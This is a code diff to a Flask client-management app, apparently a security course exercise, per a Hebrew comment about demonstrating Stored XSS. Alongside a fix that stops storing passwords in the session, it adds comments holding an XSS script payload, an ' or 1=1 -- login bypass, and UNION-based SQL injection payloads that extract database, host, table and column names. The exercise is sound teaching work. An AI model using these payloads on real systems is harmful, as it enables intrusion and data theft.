@@ -54,7 +54,7 @@ def login():
         user_data = get_user_data_from_db(username=username, password=password)
         if user_data:
             session['username'] = user_data["username"]
-            session['password'] = user_data['password']
+            session['user_id'] = user_data['user_id']
             failed_login_attempts[request.remote_addr] = 0
             return redirect(url_for('dashboard'))
         else:
@@ -124,6 +124,8 @@ def dashboard():
 
 @app.route('/add_new_client', methods=['GET', 'POST'])
 def add_new_client():
+    # todo: 1.	הצגת דוגמא לשימוש בהתקפה מסוג Stored XSS בסעיף 4 מחלק א
+    # todo: write  <script>alert('you are hacked!!')</script> in username
     if 'username' not in session:
         return redirect(url_for('login'))
 
@@ -231,7 +233,21 @@ def password_reset():
 @app.route('/search_client_data', methods=['POST'])
 def search_client_data():
     # todo: to get all clients insert in username  ' or 1=1 --
-    #todo
+    '''
+    GET DB NAME:
+    a' UNION ALL SELECT NULL, NULL, NULL, NULL,  NULL, NULL, NULL, NULL,DB_NAME();--
+
+    GET HOST NAME:
+    a' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,(HOST_NAME());--
+
+    GET COLUMNS NAMES:
+    a' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,(SELECT column_name + ', ' AS 'data()' FROM information_schema.columns FOR XML PATH(''));--
+
+    GET TABLE NAMES:
+    a' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,(SELECT name  + ', ' AS 'data()' FROM CommunicationLTD..sysobjects WHERE xtype = 'U' FOR XML PATH(''));--
+
+    '''
+
     client_first_name = request.form.get('first_name')
     client_last_name = request.form.get('last_name')
     client_data = get_client_data_by_name(client_first_name, client_last_name)
